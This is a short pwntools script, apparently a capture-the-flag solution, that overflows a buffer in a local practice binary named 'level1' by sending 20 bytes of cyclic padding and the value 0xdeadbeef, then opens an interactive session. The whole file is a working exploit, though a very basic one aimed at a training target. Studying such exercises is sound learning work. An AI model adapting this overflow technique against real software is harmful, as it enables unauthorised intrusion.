from pwn import *

offset = 20 #calculated with cyclic() function

DEBUG = False

if DEBUG:
  r = gdb.debug("./level1")
else:
  r = process("./level1")

print(r.recvuntil("me!\n").decode())
r.sendline(cyclic(offset)+p32(0xdeadbeef))
print(r.recvline().decode())
r.interactive()

